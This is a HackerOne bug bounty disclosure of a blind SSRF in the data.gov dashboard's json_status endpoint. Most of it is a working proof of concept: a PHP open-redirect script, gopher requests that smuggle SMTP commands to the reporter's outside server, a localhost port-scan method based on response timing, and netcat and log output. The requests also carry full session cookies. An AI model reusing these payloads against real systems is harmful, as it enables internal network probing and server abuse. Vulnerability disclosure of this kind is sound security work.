# Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/ Endpoint

## Metadata
- **Source:** HackerOne
- **Report:** 895696 | https://hackerone.com/reports/895696
- **Submitted:** 2020-06-10
- **Reporter:** mariuszdeepsec
- **Program:** Unknown
- **Bounty:** $300
- **Severity:** medium
- **Vuln:** Use of Inherently Dangerous Function
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary:
Due to improper routes handling multiple malicious actions are possible. Attacker is able to call Class/Function/Param1/Param2 directly from source code. this may lead to call function that should be not accessible from GUI.

Any Class from 
https://github.com/GSA/project-open-data-dashboard/tree/master/application/controllers
Can be called and any function as all of them are public.



## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:
Due to improper routes handling multiple malicious actions are possible. Attacker is able to call Class/Function/Param1/Param2 directly from source code. this may lead to call function that should be not accessible from GUI.

Any Class from 
https://github.com/GSA/project-open-data-dashboard/tree/master/application/controllers
Can be called and any function as all of them are public.

## Description:
Below we present example function call from routes. As example we present "json_status" function located at
https://github.com/GSA/project-open-data-dashboard/blob/f29c98267f7d843e82bfdd0f61a8272a6225aeb6/application/controllers/Campaign.php#L1048

Following URL Allow to call "json_status" function
Function definition is following:
```
    public function json_status($status, $real_url = null, $component = null)
```

To call function parameters we have to call following URL:
https://labs.data.gov/dashboard/Campaign/json_status/$status/$real_url/$component

Example URL will call SSRF to localhost using gopher protocol:
https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1/

Due to this functionality multiple actions was possible


## SSRF:

1. Prepare malicious php file on VPS
**o.php
```
root@vps778339:/var/www/html# cat o.php
<?php
$s = $_GET["s"];
header("Location: ".$s);
?>
```

2. Send request to "json_status" function as below described.

POC
---

**Request to send gopher request:
```
GET /dashboard/Campaign/json_status/%68%74%74%70%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%2f%6f%2e%70%68%70%3f%73%3d%67%6f%70%68%65%72%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%3a%32%35%2f%5f%48%45%4c%4f%25%32%30%74%65%73%74%2e%6f%72%67%25%32%35%30%64%25%32%35%30%61%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%25%32%30%25%32%35%30%64%25%32%35%30%61%52%43%50%54%25%32%30%54%4f%3a%6b%6f%6e%74%61%6b%74%40%64%65%65%70%73%65%63%2e%70%6c%25%32%35%30%64%25%32%35%30%61%44%41%54%41%25%32%35%30%64%25%32%35%30%61%54%65%73%74%25%32%35%30%64%25%32%35%30%61%2e HTTP/1.1
Host: labs.data.gov
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Connection: close
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_session_dashboard=edfaf301c4e59b7738f32c01e3d3b7da962efe7c
Upgrade-Insecure-Requests: 1
DNT: 1
```

** Netcat from server:
```
root@vps778339:/var/www/html#
root@vps778339:/var/www/html#
root@vps778339:/var/www/html#
root@vps778339:/var/www/html# nc -lvp 25
Listening on [0.0.0.0] (family 0, port 25)
Connection from ec2-18-213-100-122.compute-1.amazonaws.com 21688 received!
HELO test.org%0d%0aMAIL FROM: %0d%0aRCPT TO:kontakt@deepsec.pl%0d%0aDATA%0d%0aTest%0d%0a.
root@vps778339:/var/www/html# nc -lvp 25
Listening on [0.0.0.0] (family 0, port 25)
Connection from ec2-18-213-100-122.compute-1.amazonaws.com 43055 received!
HELO test.org
MAIL FROM:
RCPT TO:kontakt@deepsec.pl
DATA
Test
.
root@vps778339:/var/www/html#
```

**Request:
```
GET /dashboard/Campaign/json_status/http%3A%2F%2F51.178.47.176%2Fo.php%3Fs%3Dhttp%3A%2F%2F51.178.47.176%2Ftest HTTP/1.1
Host: labs.data.gov
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Connection: close
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_session_dashboard=edfaf301c4e59b7738f32c01e3d3b7da962efe7c
Upgrade-Insecure-Requests: 1
DNT: 1
```

**Part of log file:
```
ler"
18.213.100.122 - - [10/Jun/2020:23:25:50 +0200] "HEAD /test HTTP/1.1" 200 200 "-" "Data.gov data.json crawler"
18.213.100.122 - - [10/Jun/2020:23:25:50 +0200] "HEAD /test HTTP/1.1" 200 200 "-" "Data.gov data.json crawler"
18.213.100.122 - - [10/Jun/2020:23:25:50 +0200] "GET /test HTTP/1.1" 200 205 "-" "Data.gov data.json crawler"
```

Check if local port is OPEN due to response time or timeout and gopher protocol.
--

Closed  port "4445" scenario
---
Request
```
GET /dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A4445 HTTP/1.1
Host: labs.data.gov
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Connection: close
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_session_dashboard=edfaf301c4e59b7738f32c01e3d3b7da962efe7c
Upgrade-Insecure-Requests: 1
DNT: 1
```

Response time - 163 milliseconds
---
```
HTTP/1.1 200 OK
Date: Wed, 10 Jun 2020 22:01:27 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: max-age=0, no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: -1
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST, PUT, GET, DELETE, OPTIONS
Referrer-Policy: origin
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Set-Cookie: citrix_ns_id=V6DFBFvHdbloNzsXYUzRgEDaxMQ0002; Domain=.data.gov; Path=/; Secure; HttpOnly
Set-Cookie: citrix_ns_id_.data.gov_%2F_wlf=AAAAAAXEw6HEe4o1Cxekp1iLlT73fDFKjSVqt3yaBcynLQLijox1_gtswdWWg5IOnZnVT6k4mONlxe5iAVstYUzN7TAFWPJFVCcQSRO0POEEN_AqFQ==&AAAAAAVNIok4r26-l3dSvg8n4ZfZJ37Wpn-ZwUcwWh_6fOAwKJnh-sw5RY6U7ywhAMLxEMiOEw7RoBUyzx7NbRfMp-zAZog_Q7azF9KsFo-jJ5nwEw==&; Domain=.data.gov; Max-Age=604800; Path=/; Version=1; Secure; HttpOnly
Set-Cookie: citrix_ns_id_.data.gov_%2F_wat=AAAAAAWlKuAUjIivKHq_TzdkV64qXJJt7Qqj8fXU71deDgdKvHiqLsiRBDS4vnmJMRxoRYyuRmTbJndfxSGMHy7pq-J_&; Domain=.data.gov; Path=/; Secure; HttpOnly
Content-Length: 0
```

Open port "443" scenario lead to 502 gateway timeout
---
Request
```
GET /dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A443 HTTP/1.1
Host: labs.data.gov
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0

</details>

---
*Analysed by Claude on 2026-05-24*
